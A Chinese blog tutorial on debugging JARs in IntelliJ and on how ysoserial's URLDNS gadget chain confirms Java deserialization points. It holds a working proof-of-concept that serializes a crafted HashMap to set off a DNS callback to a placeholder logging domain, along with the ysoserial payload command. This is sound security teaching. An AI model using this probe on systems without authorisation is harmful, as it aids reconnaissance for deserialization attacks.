<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="前言推荐阅读时间：10min 内容-基础向：  在IDEA中JAR的三种调试方式 Ysoserial工具中URLDNS模块的原理分析 POC代码以及Ysoserial的源码分析   题外话：最近有一个小伙伴用**x@v.team**的邮箱戳我，已经写好了回件但是由于找不到这个邮箱地址回不回去。莫非用了伪装源地址的骚操作？但是为啥这么做呢emmm…..如果你看到这篇文的话，可以再私戳我认领下回信….">
<meta name="keywords" content="java,ysoserial">
<meta property="og:type" content="article">
<meta property="og:title" content="JAVA反序列化-ysoserial-URLDNS">
<meta property="og:url" content="http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/index.html">
<meta property="og:site_name" content="啦啦菌NODE">
<meta property="og:description" content="前言推荐阅读时间：10min 内容-基础向：  在IDEA中JAR的三种调试方式 Ysoserial工具中URLDNS模块的原理分析 POC代码以及Ysoserial的源码分析   题外话：最近有一个小伙伴用**x@v.team**的邮箱戳我，已经写好了回件但是由于找不到这个邮箱地址回不回去。莫非用了伪装源地址的骚操作？但是为啥这么做呢emmm…..如果你看到这篇文的话，可以再私戳我认领下回信….">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1u068c7j30yj0dnmxt.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1u4ru8lj31n913xgo8.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1ub4zftj31nu140n02.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1ujsnrpj31510rbq5f.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1ueuwpcj31gi0jcjsy.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1urfik2j30wv0gq3zb.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1uxrbedj30zt0fbdg4.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1vz3hfgj312w0sv75w.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1vhwypaj31cm0u9gnr.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1vnnmt5j31mj13cq99.jpg">
<meta property="og:updated_time" content="2020-03-27T08:23:02.315Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="JAVA反序列化-ysoserial-URLDNS">
<meta name="twitter:description" content="前言推荐阅读时间：10min 内容-基础向：  在IDEA中JAR的三种调试方式 Ysoserial工具中URLDNS模块的原理分析 POC代码以及Ysoserial的源码分析   题外话：最近有一个小伙伴用**x@v.team**的邮箱戳我，已经写好了回件但是由于找不到这个邮箱地址回不回去。莫非用了伪装源地址的骚操作？但是为啥这么做呢emmm…..如果你看到这篇文的话，可以再私戳我认领下回信….">
<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1u068c7j30yj0dnmxt.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>JAVA反序列化-ysoserial-URLDNS</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/06/22/RMI 反序列化-深入-上/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/02/14/智能合约蜜罐-区块链浏览器/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&text=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&title=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&is_video=false&description=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=JAVA反序列化-ysoserial-URLDNS&body=Check out this article: http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&title=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&title=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&title=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&title=JAVA反序列化-ysoserial-URLDNS"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2020/03/05/JAVA反序列化-ysoserial-URLDNS/&name=JAVA反序列化-ysoserial-URLDNS&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在IDEA中JAR的三种调试方式"><span class="toc-number">2.</span> <span class="toc-text">在IDEA中JAR的三种调试方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JAR起端口的远程调试"><span class="toc-number">2.1.</span> <span class="toc-text">JAR起端口的远程调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试器起端口的远程调试"><span class="toc-number">2.2.</span> <span class="toc-text">调试器起端口的远程调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JAR源代码调试"><span class="toc-number">2.3.</span> <span class="toc-text">JAR源代码调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS"><span class="toc-number">3.</span> <span class="toc-text">URLDNS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap"><span class="toc-number">3.1.</span> <span class="toc-text">HashMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列化过程"><span class="toc-number">3.2.</span> <span class="toc-text">反序列化过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#回看payload生成"><span class="toc-number">3.3.</span> <span class="toc-text">回看payload生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#看看Ysoserial是怎么做的"><span class="toc-number">3.4.</span> <span class="toc-text">看看Ysoserial是怎么做的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        JAVA反序列化-ysoserial-URLDNS
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">啦啦菌NODE</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-03-05T06:05:33.000Z" itemprop="datePublished">2020-03-05</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/java/">java</a>, <a class="tag-link" href="/tags/ysoserial/">ysoserial</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>推荐阅读时间：10min</p>
<p>内容-基础向：</p>
<ul>
<li>在IDEA中JAR的三种调试方式</li>
<li>Ysoserial工具中URLDNS模块的原理分析</li>
<li>POC代码以及Ysoserial的源码分析</li>
</ul>
<blockquote>
<p>题外话：<br>最近有一个小伙伴用<a href="mailto:**x@v.team" target="_blank" rel="noopener">**x@v.team</a>**的邮箱戳我，已经写好了回件但是由于找不到这个邮箱地址回不回去。莫非<br>用了伪装源地址的骚操作？但是为啥这么做呢emmm…..如果你看到这篇文的话，可以再私戳我认领下回信…..</p>
</blockquote>
<h2 id="在IDEA中JAR的三种调试方式"><a href="#在IDEA中JAR的三种调试方式" class="headerlink" title="在IDEA中JAR的三种调试方式"></a>在IDEA中JAR的三种调试方式</h2><p>在开始前，先分享下对于jar文件的三种调试方式。</p>
<h3 id="JAR起端口的远程调试"><a href="#JAR起端口的远程调试" class="headerlink" title="JAR起端口的远程调试"></a>JAR起端口的远程调试</h3><p>这种调试方式主要针对有界面，启动后不会自动退出的一类jar包。如attackRMI.jar</p>
<ol>
<li>调试运行jar，这将会使jar起一个5005端口等待调试器连接</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar attackRMI.jar</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>idea随便一个项目引入这个jar包</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1u068c7j30yj0dnmxt.jpg" alt="调试-导入包.png"></p>
<ol start="3">
<li>IDEA调试配置处，配置Remote监听配置——Attach to remote JVM</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1u4ru8lj31n913xgo8.jpg" alt="调试1.png"></p>
<ol start="4">
<li>在需要调试的jar包中下断点，选择远程调试器，DEBUG开始调试</li>
</ol>
<blockquote>
<p>可以注意到在配置调试器连接远程监听的时候，有远程JVM的命令代码，如果jdk版本是8以上命令会有所不同，可以手动选择 然后替换命令跑jar。</p>
</blockquote>
<h3 id="调试器起端口的远程调试"><a href="#调试器起端口的远程调试" class="headerlink" title="调试器起端口的远程调试"></a>调试器起端口的远程调试</h3><p>但是遇到一些运行后就立马结束退出的情况，比如ysoserial，以上的方法jar起端口等待调试器连接的办法就不成了。（因为立刻退出了，调试器根本来不及连接）</p>
<p>我们可以换一种方式反一反：让IDEA调试器起端口监听，jar连接至调试端口进行调试</p>
<ol>
<li>IDEA配置监听远程调试——Listen to remote JVM</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1ub4zftj31nu140n02.jpg" alt="调试2.png"></p>
<ol start="2">
<li>IDEA下断点，开始调试DEBUG，这样IDEA就会起一个5055监听端口</li>
<li>调试运行JAR，使JAR连接至IDEA-DEGUB端口进行调试：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=n,address=LAPTOP-50N17D1J:5005,suspend=y  -jar F:\BanZ\java\ysoserial.jar</span><br></pre></td></tr></table></figure>
<blockquote>
<p>以上的命令不是大家都通用的，可以从IDEA里面复制出来，删除&lt;&gt;的两项可选项即可。</p>
<p>同样根据jdk版本不同，命令也会有变化。</p>
</blockquote>
<h3 id="JAR源代码调试"><a href="#JAR源代码调试" class="headerlink" title="JAR源代码调试"></a>JAR源代码调试</h3><p>通常来说以上两种就够用了，但是还有一种调试方式，在局部调试中更为方便：在源代码中调用特定class文件的main函数进行调试：</p>
<p>以ysoserial的URLDNS模块为例，由于在ysoserial中所有payload生成接口都可以从<code>ysoserial.GeneratePayload</code>进入，我们可以调用该类的main函数同时指定参数，进入任意payload生成模块。</p>
<p>看一下GeneratePayload的main函数：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1ujsnrpj31510rbq5f.jpg" alt="调试3-1.png"></p>
<ol>
<li>IDEA配置固定class文件，配置传入参数（跟命令行调用一样）</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1ueuwpcj31gi0jcjsy.jpg" alt="调试3.png"></p>
<ol start="2">
<li>下断点，开始DEBUG调试</li>
</ol>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>那么开始细看<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>，从最简单的模块开始。</p>
<p>在渗透测试中，如果对着服务器打一发JAVA反序列化payload，而没有任何回应，往往就不知道问题出在了哪里的蒙蔽状态。</p>
<ul>
<li>打成功了，只是对方机器不能出网？</li>
<li>还是对面JAVA环境与payload版本不一样，改改就可以？</li>
<li>还是对方没有用这个payload利用链的所需库？利用链所需库的版本不对？换换就可以？</li>
<li>还是…以上做的都是瞎操作，这里压根没有反序列化readobject点QAQ</li>
</ul>
<p>而URLDNS模块正是解决了以上疑惑的最后一个，确认了readobject反序列化利用点的存在。不至于payload改来改去却发现最后是因为压根没有利用点所以没用。同时因为这个利用链不依赖任何第三方库，没有什么限制。</p>
<p>如果目标服务器存在反序列化动作（readobject），处理了我们的输入，同时按照我们给定的URL地址完成了DNS查询，我们就可以确认是存在反序列化利用点的。</p>
<p>从JAVA反序列化RCE的三要素（readobject反序列化利用点 + 利用链 + RCE触发点）来说，是通过（readobject反序列化利用点 + DNS查询）来确认readobject反序列化利用点的存在。</p>
<p>ysoserial payload生成命令：<code>java -jar ysoserial.jar URLDNS &quot;自己能够查询DNS记录的域名&quot;</code><br>（这里可以使用ceye做DNS查询）</p>
<p>我们先抛开ysoserial，看一下网上的测试代码弄清楚原理，在之后再回过来看ysoserial的实现。</p>
<p>POC测试代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//0x01.生成payload</span></span><br><span class="line">        <span class="comment">//设置一个hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//设置我们可以接受DNS查询的地址</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://xxx.ceye.io"</span>);</span><br><span class="line">        <span class="comment">//将URL的hashCode字段设置为允许修改</span></span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span></span><br><span class="line">        <span class="comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">        <span class="comment">//2. 将url放入hashMap中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">        <span class="comment">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line">        <span class="comment">//0x02.写入文件模拟网络传输</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.读取文件，进行反序列化触发payload</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在跑通以上代码，有几个注意点：</p>
<ol>
<li>不能使用ip+端口进行回显，因为此处功能为DNS查询，ip+端口不属于DNS查询。同时在代码底层对于ip的情况做了限制，不会进行DNS查询。</li>
<li>最好不要使用burp自带的dns查询，会过一段时间就会变换了，可能会导致坑。这里使用了ceye查看DNSLOG</li>
</ol>
<p>直接跑测试一波，有回显</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1urfik2j30wv0gq3zb.jpg" alt="ceye.png"></p>
<p>从测试代码的<strong>0x01部分</strong>payload生成中，我们可以看个大概payload结构，但是也有一些蜜汁细节，回头再来追究，主要确认三个名词<code>HashMap</code>、<code>URL</code>、<code>HashCode</code>。</p>
<p>仔细看一下可以知道最终的payload结构是 一个<code>HashMap</code>，里面包含了 一个修改了<code>HashCode</code>为-1的<code>URL</code>类</p>
<p>那么具体细节我们就直接在<code>ois.readObject();</code>这个反序列化语句中去调试分析过程。</p>
<p>我们知道java反序列化的执行入口就是<strong>readObject方法</strong>，而我们最外层的包装就是HashMap，那么这个链自然是从HashMap的readObject开始的（这是JAVA反序列化的基础，不了解的话可以从以往的博客补课）。</p>
<p>找到JDK包中的HashMap类的readObject方法下断点，开始调试：</p>
<blockquote>
<p>此处会有一个问题就是我们到底怎么在JDK包中找到HashMap这个类的readobject函数呢？因为JDK的类超级多，难道我们必须要一个个翻找？</p>
<p>其实搜索是可以搜索导入包的内容的，Ctrl+Shift+F 在Scope - All Places 搜索<code>class hashmap</code>即可</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1uxrbedj30zt0fbdg4.jpg" alt="查找包.png"></p>
</blockquote>
<p>然后我们就可以成功开始调试了，但是看着hashmap类中的代码马上就会一头雾水。因为我们根本不了解hashmap是啥。</p>
<h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>在开始正式调试阅读代码前，我们需要知道HashMap的大致原理：</p>
<p><a href="https://blog.csdn.net/woshimaxiao1/article/details/83661464" target="_blank" rel="noopener">HashMap</a>是一种为提升操作效率的数据结构，本质在使用上还是存取key-value键值对的使用方式，但是在实现上引入了key值的HASH映射到一维数组的形式来实现，再进入了链表来解决hash碰撞问题（不同的key映射到数组同一位置）。</p>
<p>从键值对的设置和读取两方面来解释：</p>
<p>设置新键值对 key-value：</p>
<ol>
<li>计算key的hash：Hash(k)</li>
<li>通过Hash(k)映射到有限的数组a的位置i</li>
<li>在a[i]的位置存入value</li>
<li>因为把计算出来的不同的key的hash映射到有限的数组长度，肯定会出现不同的key对应同一个数组位置i的情况。如果发现a[i]已经有了其他key的value，就放入这个i位置后面对应的链表（根据多少的情况可能变为树）中。</li>
</ol>
<p>读取key的value：</p>
<ol>
<li>计算key的hash：Hash(k)</li>
<li>通过Hash(k)映射到有限的数组a的位置i</li>
<li>读取在a[i]的位置的value</li>
<li>如果发现a[i]已经有了其他key的value，就遍历这个i位置后面对应的链表（根据多少的情况可能变为树）去查找这个key再去取值。</li>
</ol>
<h3 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h3><p>那么这个Hashmap数据结构是如何序列化传输的呢？</p>
<p><code>java.util.HashMap#writeObject</code>分为三个步骤进行序列化：</p>
<ol>
<li>序列化写入一维数组的长度（不是特别确定，但是这个值在反序列化中是不使用的，所以不太重要）</li>
<li>序列化写入键值对的个数</li>
<li>序列化写入键值对的键和值；</li>
</ol>
<p><code>java.util.HashMap#readObject</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="comment">//...省略代码...</span></span><br><span class="line">        <span class="comment">//读取一维数组长度，不处理</span></span><br><span class="line">        <span class="comment">//读取键值对个数mappings</span></span><br><span class="line">        <span class="comment">//处理其他操作并初始化</span></span><br><span class="line">        <span class="comment">//遍历反序列化分辨读取key和value</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">        	<span class="comment">//URL类也有readObject方法，此处也会执行，但是DNS查询行为不在这，我们跳过</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            <span class="comment">//注意以下这句话</span></span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p> <code>putVal</code>是往HashMap中放入键值对的方法，上面也说到在放入时会计算<strong>key的hash</strong>作为转化为数组位置<strong>i</strong>的映射依据。</p>
<p><strong>而DNS查询正是在计算URL类的对象的hash的过程中触发的</strong>，即hash(key)。</p>
<p>跟进<code>hash(key)</code>：<code>java.util.HashMap#hash</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传入的key是一个URL对象，不同对象的hash计算方法是在各自的类中实现的，这里<code>key.hashCode()</code>调用URL类中的hashCode方法：<code>java.net.URL#hashCode</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">transient</span> URLStreamHandler handler; <span class="comment">//这个URL传输实现类是一个transient临时类型，它不会被反序列化（之后会用到）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> hashCode = -<span class="number">1</span>;<span class="comment">//hashCode是private类型，需要手动开放控制权才可以修改。</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">//判断如果当前对象中的hashCode不为默认值-1的话，就直接返回</span></span><br><span class="line">       <span class="comment">//意思就是如果以前算过了就别再算了</span></span><br><span class="line">       <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">           <span class="keyword">return</span> hashCode;</span><br><span class="line">	<span class="comment">//如果没算过，就调用当前URL类的URL传输实现类去计算hashcode</span></span><br><span class="line">       hashCode = handler.hashCode(<span class="keyword">this</span>);<span class="comment">//进入此处</span></span><br><span class="line">       <span class="keyword">return</span> hashCode;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p><code>java.net.URLStreamHandler#hashCode</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此处传入的URL为我们自主写入的接受DNS查询的URL</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;<span class="comment">//计算的hash结果</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用url的协议部分，计算hash</span></span><br><span class="line">        String protocol = u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//**通过url获取目标IP地址**，再计算hash拼接进入</span></span><br><span class="line">        InetAddress addr = getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//如果没有获取到，就直接把域名计算hash拼接进入</span></span><br><span class="line">            String host = u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br></pre></td></tr></table></figure>
<p>至此我们就看到了<code>getHostAddress(u)</code>这一关键语句，通过我们提供的URL地址去获取对应的IP。再往后还有一些函数调用，但是更为底层，而不太关键，就不继续跟了。</p>
